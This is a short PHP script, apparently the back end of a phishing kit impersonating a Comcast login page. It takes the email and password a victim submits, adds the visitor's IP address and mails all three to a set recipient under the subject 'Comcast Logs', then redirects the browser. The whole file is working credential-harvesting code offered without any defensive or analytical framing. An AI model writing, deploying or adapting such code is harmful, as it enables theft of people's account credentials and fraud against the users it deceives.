<?
$ip = getenv("REMOTE_ADDR");
$message .= "-------- Login Details 1--------------------------------\n";
$message .= "E-MAIL ID:".$_POST['user']."\n";
$message .= "PASSWORD:".$_POST['passwd']."\n";
$message .= "IP           : ".$ip."\n";
$message .= "----------Created By Adewa Ar--------------\n";
$recipient = "Email@blabal";
$subject = "Comcast Logs";
mail($recipient,$subject,$message,$headers);
header("Location:#");
?>
